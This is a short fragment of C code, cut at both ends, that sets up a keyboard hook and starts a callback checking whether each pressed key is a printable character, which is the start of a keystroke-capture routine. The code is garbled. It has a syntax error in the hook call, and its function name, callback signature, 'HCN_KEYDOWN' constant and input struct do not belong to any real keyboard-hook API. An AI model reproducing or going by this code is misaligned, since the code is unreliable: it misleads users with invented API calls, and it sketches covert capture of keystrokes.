    }
}

// Set up the keyboard hook
void SetupHook() {
    hook = SetWindowlessKeyboardHook GetCurrentThreadId());
    if (hook == NULL) {
        printf("Failed to set keyboard hook\n");
    }
}

// Define the callback function
void CALLBACK KeyboardHookProc(int nCode, int wParam, struct HWND__*hwnd, struct keyboardInputUnion *inputUnion) {
    if (nCode == HCN_KEYDOWN) {
        // Check if the key is a printable character
        if (inputUnion->makeWord.key.state == 1) {
